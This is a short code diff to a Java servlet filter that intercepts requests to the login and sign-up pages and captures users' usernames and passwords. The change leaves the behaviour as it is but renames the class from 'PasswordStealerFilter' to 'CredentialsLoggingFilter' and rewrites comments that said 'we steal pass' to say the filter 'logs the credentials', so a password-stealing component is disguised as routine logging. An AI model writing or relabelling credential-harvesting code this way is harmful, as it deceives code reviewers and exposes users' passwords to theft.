@@ -12,18 +12,18 @@ import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 
 @WebFilter(urlPatterns = {"/signUp", "/login"})
-public class PasswordStealerFilter extends HttpFilter {
+public class CredentialsLoggingFilter extends HttpFilter {
     private ServletContext servletContext;
 
     @Override
     protected void doFilter(HttpServletRequest req, HttpServletResponse res, FilterChain chain) throws IOException, ServletException {
 
         if (req.getRequestURI().contains("login")) {
-            // before we go to log in we steal pass
+            // before we go to log in we log the credentials
             getLogAndPassAndLogging(req, res);
             chain.doFilter(req, res);
         } else {
-            // after sign up processing we steal pass
+            // after sign up processing we log the credentials
             chain.doFilter(req, res);
             getLogAndPassAndLogging(req, res);
         }
@@ -32,7 +32,7 @@ public class PasswordStealerFilter extends HttpFilter {
     @Override
     public void init(FilterConfig filterConfig) {
         this.servletContext = filterConfig.getServletContext();
-        this.servletContext.log("PasswordStealerFilter initialized");
+        this.servletContext.log("CredentialsLoggingFilter initialized");
     }
 
     private void getLogAndPassAndLogging(HttpServletRequest req, HttpServletResponse res) {
